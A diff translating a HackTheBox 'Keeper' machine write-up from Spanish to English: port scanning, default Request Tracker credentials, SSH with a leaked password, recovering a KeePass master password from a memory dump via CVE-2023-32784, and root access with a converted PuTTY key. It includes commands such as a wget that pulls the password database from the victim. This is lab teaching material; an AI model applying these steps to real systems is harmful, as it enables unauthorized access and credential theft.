@@ -4,27 +4,26 @@ layout: writeup
 date: 2026-04-14
 dificultad: Easy
 plataforma: HackTheBox
-lang: es
+lang: en
 ---
-
 # Keeper HTB Machine
 
 ## 🧠 Enumeration
 
-Empezamos con un escaneo completo:
+We start with a full scan:
 
 ```bash
 nmap -p- -T4 --min-rate 5000 -sV -sC -O -Pn -sS 10.10.11.227 -vvv
 ```
 
-Puertos abiertos:
+Open ports:
 
-* 80 (HTTP)
-* 22 (SSH)
+*80 (HTTP)
+*22 (SSH)
 
 ![Nmap](/images/keeper_1.png)
 
-La web redirige a:
+The website redirects to:
 
 ```
 tickets.keeper.htb/rt/
@@ -34,13 +33,13 @@ tickets.keeper.htb/rt/
 
 ## 🌐 Web Enumeration
 
-Problema típico: no resolvía el dominio.
+Typical problem: it did not resolve the domain.
 
 ```bash
 sudo vim /etc/hosts
 ```
 
-Añadimos:
+We add:
 
 ```
 10.10.11.227 tickets.keeper.htb
@@ -52,34 +51,34 @@ Añadimos:
 
 ## 💥 Login Panel
 
-Se detecta login con versión de Request Tracker.
+Login with Request Tracker version is detected.
 
-Probé SQLi (CVE-2013-3525) → no útil.
+Tried SQLi (CVE-2013-3525) → not helpful.
 
 ---
 
-## 🔐 Credenciales por defecto
+## 🔐 Default credentials
 
 ```text
 user: root
 pass: password
 ```
 
-👉 Acceso conseguido.
+👉 Access achieved.
 
 ![Login](/images/keeper_3.png)
 
 ---
 
-## 👀 Enumeración de usuarios
+## 👀 User enumeration
 
-Usuario encontrado:
+User found:
 
 ```
 lnorgaard
 ```
 
-Comentario interesante:
+Interesting comment:
 
 ```
 Welcome2023!
@@ -89,19 +88,19 @@ Welcome2023!
 
 ---
 
-## 🔑 Acceso SSH
+## 🔑 SSH Access
 
 ```bash
 ssh lnorgaard@10.10.11.227
 ```
 :
-⚠️ Importante:
+⚠️ Important:
 
-* es **L**norgaard, no Inorgaard
+* is **L**norgaard, not Inorgaard
 
 ---
 
-## 📦 Archivos interesantes
+## 📦 Interesting files
 
 ```bash
 RT30000.zip
@@ -111,7 +110,7 @@ RT30000.zip
 unzip RT30000.zip
 ```
 
-Contenido:
+Content:
 
 * KeePassDumpFull.dmp
 * passcodes.kdbx
@@ -120,7 +119,7 @@ Contenido:
 
 ---
 
-## 🧨 Explotación KeePass
+## 🧨 KeePass exploitation
 
 CVE:
 
@@ -128,7 +127,7 @@ CVE:
 CVE-2023-32784
 ```
 
-Permite recuperar contraseña desde dump de memoria.
+Allows you to recover password from memory dump.
 
 ---
 
@@ -147,7 +146,7 @@ python3 keepass_dump.py -f KeePassDumpFull.dmp
 
 ---
 
-## 🔍 Password recuperado
+## 🔍 Password recovered
 
 ```
 rødgrød med fløde
@@ -155,7 +154,7 @@ rødgrød med fløde
 
 ---
 
-## 🔓 Abrir KeePass
+## 🔓 Open KeePass
 
 ```bash
 sudo apt install keepass2
@@ -165,7 +164,7 @@ sudo apt install keepass2
 wget http://victim:8080/passcodes.kdbx
 ```
 
-Abrir con la passphrase.
+Open with the passphrase.
 
 ![KeePass](/images/keeper_7.png)
 
@@ -173,7 +172,7 @@ Abrir con la passphrase.
 
 ## 🧑‍💻 Root
 
-Convertimos clave:
+We convert key:
 
 ```bash
 sudo apt install putty-tools
@@ -183,7 +182,7 @@ chmod 600 id_rsa
 
 ---
 
-## 🚀 Acceso final
+## 🚀 Final access
 
 ```bash
 ssh -i id_rsa root@10.10.11.227
@@ -201,16 +200,16 @@ cat root.txt
 
 ---
 
-## 🧾 Conclusión
+## 🧾 Conclusion
 
-Máquina centrada en:
+Machine focused on:
 
-* Enumeración web
-* Credenciales expuestas
+* Web enumeration
+* Exposed credentials
 * KeePass dump exploitation
-* Abuso de claves SSH
+* SSH key abuse
 
-👉 Pequeños fallos → acceso total
+👉 Small bugs → full access
 
 ---
 
